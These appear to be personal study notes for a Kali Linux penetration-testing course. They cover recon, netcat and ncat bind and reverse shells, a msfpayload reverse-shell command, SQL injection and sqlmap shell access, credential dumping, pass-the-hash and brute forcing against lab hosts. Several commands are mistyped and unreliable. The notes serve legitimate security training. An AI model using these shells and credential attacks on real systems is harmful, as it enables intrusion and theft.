Penetration Testing With Kali, Notes & Techniques

0.1 Kali Linux contains hundreds of forensic and penetration testing tools. Finding your way arount they may be a little confusing sometimes. We will get up quickly with the next examples. As Eibraham Lincoln once said If i have 6 hours to chop down the tree, i'd spend this first 3 sharpening my axe.

0.2 Fiding FIles In Kali Linux

There are a number of Linux utilities that can be used to locate files in the linux installation. With the 3 of the most common beying find, locate and which.
All 3 of thease utilities have similat functionality, but work and return data differently from one another. Lets start with the locate tool.

Using locate
updatedb #to make sure the locate list database is updated
locate sbd.exe

Using which
which - returns the pathnames of files or links which would be executed in the current enviorment
which sbd

Usinf find - amore aggressive search tool, if i want to search for all the files in the filesystem starting with a sbd

find / -name sbd*

The find command can also take an additional parameter whcich allows for specific commands to be executed on each found file. 
Lets say i wanted to find all files that started with sbd and for each file found i would like to identify its file format using the file command.

find / -name sbd* -exec file {} \;     #the file format identifues the format  on {} the found file name 

Now let see how the services in Kali Linux works

0.3 SSH Service

TCP based secure shell service and listens by default on port 22. Later we wil go into detail about the possibilities of ssh.

service ssh start
service ssh status 

netstat -antp |grepsshd

0.4 HTTP Service

HTTP can come in handy during a penetrtation test. Either for hosting a site or peoviding a platform for downloading files to a victim machine.
Its is TCP basedand listens by default on 80.

service apache2 start
the root dir is /var/www by default

echo "Kali linux rocks" > /var/www/index.html

0.5 Service Management

/etc/init.d/
Another commonly used syntax to manage services is directly throught their init scripts 

/etc/init.d/ssh start
same for apache etc

0.6 Service Boot Persistence

In certain situations when we want certain services to persist over a reboot. A good exaple would be a remote installation of Kali to which we would like to access through ssh. So if we want to have the ssh service start automatically at boot time. We need to enable it.

update-rc.d ssh enable

So ssh will persist after every reboot. Same apply for all services.

rcconf - debian runlevel configuration tool

0.7 The Bash SHell

Popular Unix shell that proveds us with a very powerfull working enviorment. It also provides a scripting engine that we can make use of. By writing simple scripts and automating procedures using existing linux tols and commands. Being able to quickly write a bash scrip to automate a givven task is an essential requierment for any security professional. SO let make a gentle introduction to bash scripting.

0.8 Scenario #1
Imagine you are tasket with finding all of the cisco subdomains listed on their index page and then find their corresponding ip addresses. Doing this manualy could be frustrating and will take a long time. However with some simple bash commands we can turn this into a simple task. I will start by downloading the sisco.com web page using the wget command.

wget www.cisco.com #it downloads the index file from the website

more index.html  #looking the file 

seems that the links that we are looking for are mostly found in html list entities. Lets start by grepping out all the lines that begin with
cat index.html |grep "href="

the output of this grep command is still a bit of a mess but we've identified the links that we want to extract, however we still have alot of html in the way
We noticed that most of the lines have a similat structure to them and could be split conviniently using the "/" as a delimiter. To specificly extract the domain names from the file we can try using the cut command with out delimeter set at the third field.

cat index.html |grep "href=" |cut -d"/" -f3|more   # cutting the output using a / and request to have the -f3 third field printed out.

the output is far from optimal and we probably missed some links along the way, but lets continue this exercise and what comes out of it.
The text now contains some domain names and some useless entries. Lets see if we could clean this link to include only domain names. Ww will filter all the lines that do not contain the text cisco.com.

cat index.html |grep "href=" |cut -d"/" -f3|more |grep "cisco\.com"|more 

so now every single entry is a domain containing cisco.com, however we see that some of thease entries seem to have a " at the end of it. So we can use the cut command once more but this time we will include the "


cat index.html |grep "href=" |cut -d"/" -f3|more |grep "cisco\.com"|cut -d'"' -f1|more 

so now we have a nice clean list but lots of duplicates we can clean them by piping the output of the previous command to the sort command with -u or unique option 

cat index.html |grep "href=" |cut -d"/" -f3|more |grep "cisco\.com"|cut -d'"' -f1|sort -u 

and now we have a nice short list of cisco domains which ware extracted from the thlm file 
As with most things in linux we could probably tidy up and improve on our previous synthax. (pwk9 -0:4:30)

The scenario also requiered to find the corresponding ip addresses of the domain names. We can do this by using a simple bash for loop together with the linux host command. So lets see what it takes to write a simple bash scrip that will do this for us.

host www.cisco.com

ok from this syntax we have a line that provides us with the information we are looking for
and can be identified with the string "has address"
so if i wanted to extract the ip address from this output 

host www.cisco.com |grep "has address" |cut -d" " -f4 

So now that we know how to extract our data lets open a text editor and write a quick bash sript which will read all of the domain names from the cisco.txt 
and then run tho host command against each one of them. Providing a nice clean output of the console.

vi cisco.sh 

#!/bin/bash
for url in $(cat cisco.txt);do 
host $url |grep "has address" |cut -d" " -f4
done 

save give executable permissions 
chmod 755 cisco.sh
./cisco.sh

perfect!

0.9 Scenario #2
In this case we are requiered to write a bash script which will ping a sertain ip range and inform us which ip address respond to our ICMP requests.
In other words we will be writing a ping sweaper. We can do this quite simply with a simple bash script which uses a loop to itherate throught a given ip range.
And then for each ip execute the ping command with the ip as the argument. 
Since the linux ping continues indefinitely we need a way to find a way to stop it. A quick look at the man page of ping shows -c parameter allows us to specify the number of requests

vi ping-loop.sh

#!/bin/bash

for ip in $(seq 200 210); do
ping -c 192.168.31.$ip |grep "bytes from" |cut -d" " -f 4|cut -d":" -f1 &  #the & allows the process to background and not wait for the previous ping to complete, this should speed the process
done

0.10 Essential Tools
0.11 Netcat
Netcat is a network utility which is able to read & write to both TCP & UDP ports. Netcat can run in both client and server mode. Can interact with services shows banners etc.

0.12 Banner Grabbing 

nc -nv 192.168.20.35 25 #smtp 25

smtp banner is displayed this is a clear text protocol so we can interact with the service let try

HELP

interestgin we have the mail server account name...
let try to connect to a different port 

nc -nv 192.168.20.35 110 #pop3

and we have a typical pop3 service banner 

USER bob

PASS bob

nc -nv 192.168.20.35 143 #IMAP4 port

the banner here is a bit more verbose than the previous once, providing us with a name and version 
Thease ware exaples of using netcat as a tcp client and interacting with services.

0.13 NetCat Chat
Client - Server moled

windows machine nc server mode 
nc -nlvp 4444

linux machine tcp client 

nc -nv ip_address 4444

NetCat can also be used to transfer files from one machine to another

nc -nv 192,168.20.35 4444 </usr/share/windows-resources/wget.exe   #directly send a file to the listening machine on connecting

0.14 Executing Remote Commands with Netcat

Perhaps one of the more interesing features of netcat is its ability to handle command execution and output redirection.Nc can take an executable file and redirect the input/output and error msgs from that program to a tcp/udp port rather than the default console. To explain this further consider the cmd.exe on windows by rediresting the stdin/stdout and error of the windows command prompt to the network we can effectively execute commands and control this machine from far.
The malicious minded amongs you should be raising an eyebrow by now :> As this description of remote administration of nc sonds suspiciocly malicious.

0.15 Bind Shell

scwnario: Bob user on windows system, and Alice user on the Kali machine. Bob has a public ip adress and is directly connected to the internet while Alice is located behind a firewall making her computer unaccessible and non routable from the internet.
Bob -> nc -lvp 4444 -e cmd.exe

Alice -> nc -vn 192.168.30.35 4444

SO now Alice is connected remotely to Bob's machine and has remote command access to his computer.

0.16 Reverse Shell
2 scenario: The roles are reversed Now its Alice who needs help from Bob. But Alice's PC is in a corporate network behind a firewall.Alice is unable to accept incomnig connections from Bob. Alice can make outbound connections to Bob and bob will get a prompt so he can execute command on Alice's behalf. This is called reverse shell. To get this working Bob need to se nc to listen for the netshell from Alice.

Bob: nc -lvp 4444
Alice: nc -vn 192.168.30.35 4444 -e /bin/bash

So now Bob has a Bash in his Windows Command Prompt and can execute 
id
uname -a


0.17 Ncat
One of the major drawbacks of using netcat for bind and reverse shells in real life scenarios is the fact that it lacks both encription for its communications and there is no way to limit access to incomming connections. Encription of the bind or revserse shell will aid the penetration tester in avoiding intrudion detection systems while limiting access to shells will ensure that the use of thease tools does not expose the penetrated machines to the access. To our air comes the ncat tool which is  modern day rewrite of the traditional nc tool with tons of additional features including encription and the ability to whitelist access
to specific IP's.Lets use Ncat to use a more secure bind shell between Bob and Alice, Bob would use netcat to make a secure bind shell and allow only Alice's 
IP to connect to it.


Bob: ncat -lvp 4444 -e cmd.exe --allow 192.168.30.5 --ssl  #encripted and whitelisted
Alice: ncat -v 192.168.30.35 4444 --ssl   

0.18 Wireshark 
As wireshark can capture read and disply network traffic let use it to use it for unencripted nc and encripted bindshells. 

winreshark
capture filter #will capture only traffic from my lab mashine 

host 192.168.1.5 and tcp port 4444

and do the same encripted and unencripted net cat connections and check the type of traffic that are generated.



Part 2 Passive Information Gathering 

As with most things in Life, preparation leads to success!

The process of collecting data about your target using publicly avaibable information

1, Own service and websites of the target - what do they do, how they interact with the world
- using search engines - google. 

site:"microsoft.com" -site:"www.microsoft.com" -> limiting the results to only from microsoft's domain -site - exvluding the main server of microsoft
site:"microsoft.com"filetype:ppt "penetration testing" -> showing only power point files with pen test name 
intitle: "VNC viewer for Java"   # intitle search poerator -> will be able to single out all pages with this specific title 
most of thease are exposed vnc services facing the internet
inurl:"/control/userimage.html" # exposed mobotics internet cameras

Google hacking data base -> lots of interesting google searches 

2, Active Information gathering -> when we have enought information about the target
all the tools from here are considered illegal to apply so testing should be on virtual machines

2.1 Host
host -t ns megacorpone.com 
host www.megacorp.com #display the corresponding ip address

2.2 Forward DNS Lookup
The idea behind this technique is to try to guess valid names of organizational service by trying to resolve the givven name 


vi list.txt #make this list
www
ftp
mail
proxy
owa
router
admin
firewall
www2
mx
pop3



cat forward.sh #create this bash script 
#!/bin/bash

for name in $(cat list.txt);do
          host $name.megacorpone.com|grep "has address" |cut -d" " -f1,4  #the output of the host command will be grepped for only positives hsot command results and cut to include the 1 and 4th fields of the output in this case fqdn and ip address for the given host
done


chmod 755 forward.sh
./forward.sh


watch file 28 for going under further with expanding the network






2.3 DNS Zone Transfers

ZOne transfer could be compared to a database replication act between related dns service. 


host -t ns megacomrpone.com

host -l megacorpone.com  # transfer failed

host -l megacorpone.com ns2.megacorpone.com.

successefull transfer with lots of data ... see video 

zone transfer bash script 


for server in $(host -t ns megacorpone.com |cut -d" " -f4); do host -l megacorpone.com $server;done


2.4 Port Scanning 
nmap or massscan

TCP SYN Scanning - half connect or stealth scanning 
withour completing a tcp handshake 

UDP protocol - its stateless dones not include 3 way handshake 



nmap - 1000 tcp port scan ->  iptables -vn -L  -> atound 46kb for 1000 tcp ports - if we want to scan all 65535 ports we would need to send around 3mb of traffic only for pct ports on only 1 computer ... for a network of 244 pc this could be around 1gb... in ideal pen test we would have full tcp and udp port scan witch would give us most accurate information of exposed services.

2.5 Network Sweeping

to deal with large volumes of hosts or try to conserve network traffic we could try to discover machines using various network sweeping methods

nmap -sn 192.168.31.200-254 -> scan completes in a about a second but its kinda hard to read all results if many 

so we can add -oG to save in a file to grep in format easier to digest 

nmap -sn 192.168.31.200-254 -oG ping-sweep-nmap

then grep Up ping-sweep-nmap |cut -d" " -f2   #to get only the ip addresses of the nachines that are UP

Next we can specify the specific port/s that we are interested in scanning 


nmap -p 80 192.168.31.200=254 -oG web-sweep.txt

then we can go step further with 

nmap -sT --top-ports 20 IP ADDRESS -oG top-ports-sweep.txt

and machines with multiple open services would be even more detailed scanned


2.6 Nmap OS and Banner DIscovery

-sV - banner grabbing   #serive versions
-O  - OS fingerprinting
-A - latitude checks and some additional protocol checks #interesting!!! includes the banners (enumerated service versions!!(

2.7 Nmap NSE Scripts

nmap scripting engine
/usr/share/nmap/scripts


2.8 SMB Enumeration

default ports are 139,445

nmap -p139,445 192.168.200-254 --open   #will only display hosts with open ports 

nbtscan - network scanner for NETBIOS name information

nbtscan 192.168.1.1-15  


2.9 SMB NUll Sessions

unauthenticated netbios session between 2 PC's. The type of info we are interested as attackers
rpcclient -U "" 192.168.31.206 #win2000 server for demo

with empty password 

if we get inside useful commands are :

srvinfo #further specify the OS
enumdomusers #will display a list of usernames defines on the server
getdompwinfo # will display the SMB password policy configured for this server

will could use tools in kali linux such as:
enum4linux
perl script trapper
rpcclient 

2.10 ENUM4LINUX

enum4linux -v ipaddress # tons of information

2.11 Nmap SMB NSE SCript

ls -l /usr/share/nmap/scripts/|grep smb

nmap -p 139,445 --script smb-enum-users 192.168.31.206

nmap -p 139,445 --script=smb-check-vulns --script-args=unsafe=1 192.168.31.229    #very useful scrip for fiding common vulns 


2.12 SMTP Enumeration  - port 25

under certain misconfigurations smtp can be used to gather information about users configured on the server 


nc -nv 192.168.31.251 25

when connected we can verify existing users 

VRFY bob

2.13 SMTP VRFY Bash Script

we can create a file with multiple usernames
users.txt
root 
backup
bob
dick
apache
joseph
david


for user in $(cat users.txt); do echo VRFY $user |nc -nv -w 1 192.168.31.215 25 2>/dev/null |grep ^"250";done  #look for lines that begin with 250 the SMTP code for succsesseful result

2.14 Python Port

its written on part #45 i will not write it but basically does the same as manuall typing of the previous chapters
create a socket connect to server -> VRFY user and close the socket

2.15 SNMP Enumeration
a protocol that by definition is ment to manage the network

2.16 SNMP MIB 
management information base is a database containing information usually related to network management
it is organized as a tree wiere branches represent different organizations or network functions and the leaves of the tree are final endpoints usually correspond to specific variable values that can be accessed and exposed by an external user

cat mib-values
SNMP - by default uses UDP 161

nmap -sU --open -p 161 192.168.31.200-254 --open  #-sU - use the UDP protocol

we can also use a tool called onesixtyone witch will take this a step further and give us community strings against an ip list giving the opportunity to brute force various community strings against givven ip's

we can create a file 

cat community 
public
private
manager


for ip in $(seq 200 254);do echo 192.168.31.$ip;done > ips       #list of ip addresses i want to run my ips scan against

once thease two files are ready i can then envoke 

onesixtyone -c community -i ips

2.27 SNMP Walk
We can now probe and querry SNMP service using tools such as SNMPWalk 
let try some examples vs a win lab machine snmpwalk walkthroug the extire snmp tree
snmapwalk -c public -v1 192.168.31.227 # -c community string and -v1 version of snmp protocol to use and specific lab machine ip 

it shows a top on information which is hard to read/understand. a better approach would be using the values of a file (pwk-48.mp4 -01:28)

snmpwalk -c public -v1 192.168.31.227 1.3.6.1.2.1.25.4.2.1.2 #from mib values file the Processes Path 

shows list of open ports, processes, install software, windows hotfixes e.t.c
this will definitly aid an attacker!

3.0 Vulnerability Scanning -pwk49 

agressive active information gathering techniques, generates lots of suspicious traffic!
we will just test a few of the options

nmap nse scripts

nmap -v -p 80 --script http-vuln-cve2010-2861 ip_address
nmap -v -p 80 --script all ip_address #using all scripts .. very intense and not optimised

3.1 OpenVAS
sudo gvm-setup
sudo gvm-start

vuln scanners are just a tool dont rely too much on them coas you might miss something important!

4.0 Introduction to Buffer Overflows!

To understand the concepts and mechanisms behind thease attacks we first need to understand how stack memmory works
and how it can be infected by invalid user input given to a running program. Often times certain functions in the code of a program will call aditional
functions wich it call even more functions. When this happens the execution of each function remains suspended until the last function in the chain returns
its valu. All the information needed to resume the execution of this chain of functions once the last function returns its values is stored in the part of the memory called "THE STACK". The stack also contains stored local variables used by the program. As the program uses thease variables to complete its task.
The problems arise when the code of this programs does not manage its memory correctly. For example by not sanitizing user input allowing external interferance 
with the execution of the program.

4.1 Vulnerable Code Sample
pwk53

in debugger OllyDbg
registers 
ESP - extended stackpoint register -points to the top of the running processes stack allowing the program to push and popp values from the stack  
EIP - extended extraction pointer - holds the current address location for the instruction being executed at any given time , in other words controls the 
path of code execution of a program

4.2 Buffer Overflows Windows 32 bit 
One of the first qustions that usually arrives when discussing buffer everflows is how this bug are found to begin with? How did you know that X bytes in the Y command woul dcrash the application and result in a buffer overflow? Generally speacking there are 3 main ways of identifying buffer overflows in applications
. If the source code of the application is available the source code review is probably the easiest way to identify bugs. Simply by identifying the coding
errors in their source. If the application is closed source then reverse engineering techniques could be employed to understand the execution flow of the program and search for bugs in thease flaws. Alternatevly we could try to identify as many input points an application may have and simply try to send 
various malformed data to thease input points and watch for unexpected program behavious. This provess is known as fuzzing. Such unexpected behaviour usually indicate that application might not filter sertain input correctly. A fact that could lead to discovy a hopeully exploitable vulnerability.

4.3 Fuzzing
ex.

pwk56 python script

crashing the mail server

4.4 Crashing it again

writing a simple script - skeleton exploit 

pwk57

attaching the immunity debugger to our mail server and running the python scrip t o crash again 

sending evil buffer worked again!

4.5 Controlling EIP

Considering that the EIP register controlls the execution flow of a program getting control of this register is an important aspect of the exploit development cycle

review pwk-58

4.6 Introducing out Shellcode
point of referance we found the address where the server dies but we need 
a typical reverse shell payload needs between 350 and 400 bytes of space 

see pwk59

4.7 Bad Charachters
depending on application, vulnerability type and protocols use there are sertain characters that are considered bad and should not be used in buffer, return address or shell code. 
Expereienced exploit rwiter knows to check for any and all bad characters before continuing the exploitation process. To prevent any unexplicable occurances down the road. An easy way to do this is by sending all possible characters for 00 to FF as part of our buffer and see how thease characters adult with the application after the crash occurs. 

4.8 Redirecting the execution Flow
pwk 61

4.9 Introducing the Mona Script 
3th party immunity debugger script 
!mona modules 
!mona search 
fidning the jmp esp instructions in code (FFE4)

4.10 Shellcode
Writing our own shellcode is beyond the scope of this course however we can use a payload generator from the metasploit framework

msfpayload windows/shell_reverse_tcp LHOST=192.168.30.5 LPORT=443 C #the capital C parameter tells msfplayload to provide the shellcode output in a C formatted layout wich we can use in our python script

we notise some bad characters (X00) so we need to encode this payload 

5.0 Buffer Overflows Linux 32 bit 

crossfire mmorpg game overflow with kali 32 bit with 486 kernel i686
uname -a  to check the kali system
using evanse debugger (edb)
 
5.1 Controlling EIP
5.2 Locating Space for our SHellcode 
pwk66
if we cant increase our buffer lenght what can we do?

5.3 FIrst Stage Shellcode
5.4  Locating a Return Address
pwk68

6.0 Using Public Exploits

The dangers of blindly running other people's code on our computers. Quite often we will find fake exploits on the internet wich have the purpose of 
compromising or harming the pc of anyone running thease exploits. for ex. fake ssh root exploit.
So if the internet contains fake exploits, where can we find reliable exploits to use safetly?

6.1 FIding Public Exploits
there are several reliable exploit db's

www.securityfocus.com/vulnerabilities #moved or not working anymore

exploit-db.com by offensive security

/usr/share/exploitdb

searchsploit #usefull tool for quick searching the db

many of the public exploit may not work for us as is and might need some debugging and fixing in order to get the expected results
also consider that many exploits might be one chance deals.. so the exploit is unsuccessfull the service will crash and will not be available to us for
further exploitation attempts or so eather the service or machine is restarted
For thease reasons we will never run a exploit without first examining its source code and understand its inner workings. We should always try to set up 
a small development enviorment that matches the OS's version and vulnerable software in order to test and adjust any existing exploits to match our enviorment.
Once we are fairly sure our exploit will work we can proceed to use it on our target victim machine.
Exploit code can come in all shapes and forms from python, perl,ruby scripts ro C, C++ programming languages that further complicate things.
Languages as C and C++ have different flavour between windows and linux and code written for one is often not cross compatible with the other.

6.2 Fixing Public Exploits #1

pwk73

modifying a c exploit???
gcc to compile 

6.3 FIxing Publin Exploit #2

#include <windows.h>  #looks like this code should be compiled in a windows enviorment

but how are we going to compile this in a linux OS?
to our rescue comes a windows cross compiler available in kali linux

apt-get install mingw32

6.4 Cross compiling windows exploit code

we managed to compile 
now we can use wine to run the exploit 

the success of this exploits shows that we can compile a windows exploit and linux as weall as executing it in linux...
wine is great for simple windows programs

7.0 Post exploitation - File Transfers

At the end of the day the goal of all attack vectors is most commonly to gain code execution on a target machine. We will look some of thease vectors in defail in later modules. But now lets assume we are at the point we have some control of the target machine.
This is the post exploitation phase.

In unix like enviorments we will often get tools like curl and wget preinstalled with the OS witch makes the process of file transfer easy.
In windows machines is a bit harder. There may be a few programs already installed that will help our task of uploadsing our first file.

7.1 TFTP FIle Transfer
its a udp based file transfer protocol  windows up to xp and 2003 contained it by default 
its not the ideal file transfer protocol but may do the job 

we can set up a tftp server on out kali machine  and include nc.exe in the root dir 
mkdir /fttp
atftpd --deamon --port 69 /tftp  #listening on port 69 and using /tftp as its root 
then we invoke the tftp on the compromised machine using 

tftp -i ip_of_tftp_server GET nc.exe

7.2 FTP File Transfers

Win OS often contain default ftp client, however as we previously see ftp is an interactive program that requiers input to complete, we will need to solve this 
interactivity problem before we try to use the ftp as a file transfer protocol.
Fortunatelly the win ftp supports using scipted commands using ftp -s 

on kali we set up ftp server and downlaod requested file 
apt-get install pure-ftpd
view pwk78 01:32 for detailed info about configuring the server 
and commands to execute on the compromised machine 

7.3 VBScript File Transfer 

as perl , python and ruby are perfect for unix machines. VBScript is good for some win OS

lets look at some commands that when pased in remote win shell and will create a simple http downlaoder 

cp exploit.exe /var/www/
service apache2 start 

paste the vbscript in the remote shell 
see pwk79 for detailed view of all commands

7.4 PowerShell File Transfer

powershell commands required for a file transfer pwk80

Windows Os offers a variety of methods of transfering files to a target machine from using debuged.exe in older Os, to abusing the windows background intelligence transfer service.

8.0 Privilege Escalation

The process of increasing the level of access

8.1 Privilege Escalation Exploits in Linux 
easy on a old kernel with a C script

8.2 Privilege Escalation in Windows
in this case we have a python script 

we can compile it as a windows executable file 
host it on a wabsite, download and run it on the compromised windows server 

8.3 Abusing weak Service Permissions on WIndows
Exploits arent the only way to go when it comes to privilege escalations. DUring many security engagements we often find that the process of privilege escalation is more often achieved by finding various miscofigurations on the target rather than activly exploiting a vulnerable service with high privileges.
This is especially true in corporate enviorments where patches and updates are installed on a regular basis leaving us a relatevly small known vulnerability attack surface. Often due to administrative error or poor default software configurations the mishandling of file and folder user permission on the system may lead to situations that allow for privillege escalation attacks to occur.

8.4 Abusing weak Service Permissions on Linux 
we can search the system for word rwitable files 

find / -perm -2 ! -type l -ls 2>/dev/null

interestly there is a cron script added by the root of the system that we have permissions to write and execute and it will have root privilages!!
pwk85

8.5 Client Side Attacks 

8.6 Replasing The Shellcode 
nice calculation command 

echo 354-315 |bc

8.7 Malicious Java Applets
8.8 Web Application Attacks 
cross site scripting 

8.9 Local File Inclusion

8.10 SQL injection 
pwk 91 

8.11 Classic Authentication Bypass


8.12 Blind SQL Injection 
when we dont have access to the sql database its a bit harder 

simple ' doesent give us error message coas of the configuration of the server 

and 1=2;#
we might recieve some info here 

we can always try to use time as a test parameter for our querries 

we can try to implement sleep parameter  and see if this will affect the server 
-sleep(5)

and watch if the server delays 5 sec before give us info 

='4', SLEEP(5)
might bring the fourth user in the database
experiment with that 

for malicious code and a backdoor creation see pwk95

8.13 Bypassing Interface Restrictions 

In many cases the interaction is limited by the server like a dropdown menu or input is limited to specific items or perhaps the input is checked for lenght
or special characters using client side validation.
in this case we can see the page the search field is protected and the language parameter is not sanitized however the web application interface 
does not allow easy modification for this parameter. And the request made by this page is a post request wich does not allow for easy parameter modification.
through url modification as we've done so far.To deal with cases like thease we can usuallt bypass any client side restrictions imposed on us by the webb aplicationby using a local web proxy. This proxy can intercept inbound and outbound http requests and allow us to edit the various parameters send effectivly bypassing all restrictions. A firefox plugin called tamper data will suit our needs perfectly.

8.14 SQLMap

The sql injectin process we've dont until now can be automated and several usefull tools exist in kali linux to help expedite the exploitation of thease vulnerabilities.One such notible tools is SQLMap. This tool can be used to both identify and exploit sql injection vulnerabilities. Lets use it to crawl and enumerate the various pages of our vulnerable web application and have it automatically search for sql injection vulnerabilities.

sqlmap -u http://192.168.30.35 --crawl=1

sqlmap -u hrrp://sidename --dbms=mysql --dumb --threads=5    #to dumb the database 

--os-shell # will give us a shell of the vulnerable machine WOW!

its a great and really usefull tool and its wort spending the time to learn and use it well 

9.0 Password Attacks

The theory behind password attacks is easy to comprehend. If a service of some sort requiers valid credentials to access it we can simply attempt to guess or
brute force thease credentials. Depending on the nature of the authentication the techniques and tools for thease attacks vary.
Generally speaking the passwords using our guessing attempts can come from two sources either dictionary files or from key space brute force.
As the quality of thease password files often dictates wheather a brute force attack will be successefull or not. Lets take a deeper look at thease options.

kali linux has a collection of such dictionary files which are located in 
/usr/share/wordlists/


9.1 Crunch 
Password key space brute force is a technique of generating all possible combinations of passwords givven a specifil character set and password lenght 
Lets look at a powerfull tool for creating such lists.

For example to create a file of passwords only 6 characters long containing only the following character set we can use 
crunch 6 6 0123456789ABCDEF

this will generate a file of 112mb with 16777216 lines

and every single combination will be generated 

-o list.txt # will safe the apsswords to the disk 

If we want to use more common character set in the password list we could chose to generate a wordlist using several predefined character sets available in the crunch share directory 
cat /usr/share/crunch/charset.lst

crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha -o mixedalpha.txt # the following crunch command line syntax will create a password file using mixed uppercase and lowercase letters of four character passwords 

crunch could also be used to create a more customized password lists

if we crack a simple password starting with uppercase then 2 lowercase then 2 special characters and 3 numbers

we can improve our dictionary file using the same format structure for 8 digit passwords. Crunch allow us to do this using character translation plaveholders 
crunch 8 8 -t ,@@^^%%% |more

this will generate a file over 160 Gb with 19 billion entries
crunch is really powrefull tool!!!!

9.2 PWDUMP / FGDUMP
utilities that perform in memory attacks, as they inject dll containing hash dumping code into the local security authority subsistem
LSAS process. The lsas process has the necessery privileges to extract password hashes as well as many usefull api's that can be used by hash dumping tools.

most of thease ustilities require administrative privileges. In windows->
fgdump.exe #dumping the system hashes and places them in a text file. The hashes are succesefully dumbed for the users configured on the system.
pwk99

9.3 Windows Credentials Editor WCE
WCE is a security tool that allows one to perform several attacks to obtain clear text passwords and hashes from a compromised windows host.
Among other things wce can steal credentials from memory and dump clear text passwords stored by windows authentication packages and stored on the target system

wce64.exe

it immediately shows the admin password in clear text!!!
saving us a lot of time by avoiding a lenghty brute force attack!

Once we've gone through all the trouble of getting password hashes from a target system you will usually want to try and crack them so you can make a use of the clear text values in further attacks. 
One of the most popular tools for cracking passwords is John The Ripper.
We can copy the hashes generated from fgdump to our kali.

john hashes.txt

john identifies thoes passwords as NT MD4 and proceeds to execute a dictionary brute force attack on them.
A brute force attack such as this can take a very long time.
so lets cencel for now and look at other options for cracking 

A differed approach of making use of dumbed hashes without the need of cracking them is a technique know as passing the hash. This technique allows the 
attacker to authenticate to a remote target using a valid combination of a username and a hash rather than the clear text password.
This is possible because both nt lm and lmn passwords hashes remain static in clean sessions.

9.4 Passing the Hash
the tools in passing the hash present in kali linux can use hashes to authenticate.
to see the tools simply type 

pth-   #not available in my kali laptop linix!!

pwk101

9.5 Password Profiling 

One way to customize our dict file is by using pass profiling techniques. This involves using words and phrases taken from the specific organisation we are targeting and including them in our worldlist, it will improve our chances of finding a valid password.

Using a tool like cewl we can scrape the server and generate a password list with words used there. 

cewl www.megacorpone.com -m 6 -w /root/megacorp-cewl.txt

Users tend to mutate their password in different ways this include adding numbers to their passwords, swapping lowercase for uppercase, caging certain letters to numbers etc.

We can now take our minimalisting password list generated by cewl and add common sequences to this password list.
A good tool for doing this is the password cracker John The Ripper. John comes with an expensive config file where password mutations can be defined.  Lets take this opportunity to add a simplistic rule to the John config file wich will append to numbers to
each password.

vi /etc/john/john.conf

at the end of the rules #Try the second half of split passwords
we will add another rule 

#Add two numbers to the end of each password
$[0-9]$[0-9]

save and start John

john --wordlist=megacorp-cewl.txt --rules --stdout >mutated.txt

resulting a file with almost 50000 password entries due to the multiple mutations performed on the password list.
grepping this mutated password list with nanobot shows our test machine password nanobot93. Of course this is a over simplified 
example but shows the posibilities.

9.6 Onlie Password Attacks 

9.7 Medusa
Medusa, Hydra and ncrack are probably the most popular tools for performing password security audits. They each have their strenghts and weaknesses and can handle brute forcing various protocols effectivly.

Http brute force attack using medusa initiated against ht access protected web directory.

medusa -h 192.168.31.219 -u admin -P password-file.txt -M http -m DIR:/admin -T 20

9.8 Ncrack
one of the few tools that can brute force the windows RDP protocol reliably and quickly!

ncrack -v f --user administrator -P password-file.txt rdp://192.168.31.233,CL=1

On the case a password is found it will be displayed on the console.

9.9 Hydra
Another online password cracker worth getting to know. It can be used to crack a variaty of protocol authentication schemes
as listed in the long list (just type hydra to see). Lets try to use hydra to brute force ftp service.

hydra -l admin -P password-file.txt -v 192.168.31.25 ftp

again it simply prints it out to the screen

By their very nature online password brute force attacks are noisy. Multiple failed login attampts will usually generate logs and warnings on the target system. In some cases the target system may even be set to lock out accounts after a predifined attemps of failed logins. This can be a disastrous outcome during a penetration test as valid users may be unable to access the service with their credentials until an administrator reenables their account.Keep this in mind before blindly running online brute force attacks. Depending on the protocol and password cracking tool onw common option to speed the upper brute force attack is to increse the number of login threads. However with some protocols such as remote desktop and NetBIOS increasing the number of threads may not be possible due to protocol restrictions making the password guessing process relatevly slow. On top of this the authentication negotiation of a protocol such as remote desktop is more time consumig then say http wich slows the attacks on thease protocols 
even more. It may be slower but often a remote desktop successeful password cracking will lead to a greater reward.
The hidden art behind online brute force attacks is chosing your targets userlists and password files very carefully and inteligently before initiating the attack.

9.10 Passwords and Hashes  

A cryptographic hash function is a one way funtion implementing an algorithm that givenn an arbitrary blok of data returns a fixed size steing called a hash value. One of the most important functions of cryptographic hash functions is the application and password verification.Most systems that use a password authentication mechanism need to store thease passwords locally on the machine.
Rather than store thease passwords in clear text modern authentication machanisms usually store them in as hashes to improve their general security. This is true for OS, Network Hardware etc.
This means that during the authentication process the password presented by the user is hashed and compared with the previously stored message digest.

9.11 Cracking Hashes

In Cryptanalisis password cracking is the process of recovering the clear text passphrase  givven a stored hash. Once the hashtype is known a common approach to password cracking is to simulate the authentication process by repeatedly trying guesses for the password and compairing the new generated digest with our stolen or otherwise dumped hash.Identifying the exact type of hash without having further information about the program or the mechanism that generated it 
can be very challenging and sometimes even impossible. A list of common hashes can be found on the open wow?? website wich provides us with a easy referance 
when trying to identify a password hash. Several pass cracking programs such as John applied patter natching features on a given hash in an attempt to guess the algoritm used to generate it.However this technique works on generic hashes only. 



9.12 LM and NTLM Hashing 

Microsoft Windows OS's stored hashed used passwords in the security accounts manager better known as the SAM. Windows NT based OS up to and including Windows
2003, store two different password hashes. Lan manager and NT Lan Manager. LM hashing is known to be very weak for several reasons. TO begin with 
passwords longer that 7 characters are split into two strings and each part of the string is hashed separately, second the password is converted into uppercase caracters before being hashed and third the LM hashing system doese not include source making rainbow table attacks visible.
From Windows Vsta onwards the Windows OS disables LM hashing by default and uses NTLM instead. Wich among other things is case sensitive supports all unicode 
characters and does not limit stored passwords to seven character parts. However NTLM hashes stored in the SAM database are still not salted?
The SAM database cannot be copied while the OS is running as the windows kernel keeps an exclusive file system lock on this file. However in memory attacks
to dump the SAM hashes can be mounted using various techniques.

9.13 Port Redirection and Tunneling pwk110

This next module will be a braintwister. We will deal with various forms of port redirection, tunneling and trafic encapsulation.
Understanding and mastering thease techniques will provide us with sergical tools to manipulate the direction flow of the targeted traffic which can often
be usefull in a restricted network enviorment. To better demonstrate thease traffic manipulation techniques we will explore a few network scenarious.

9.14 Port Forwarding 
Involves accepting traffic on a given ip address and then simply redirecting it to different ip and port.
pwk 111

windows machine with inbound tcp 80 traffic reying to conect to a windows server via RDP .. unsuccesseful because of the network filrewall configuration 
but with a intermediate linux machine with a public ip address we can redirect the traffic  

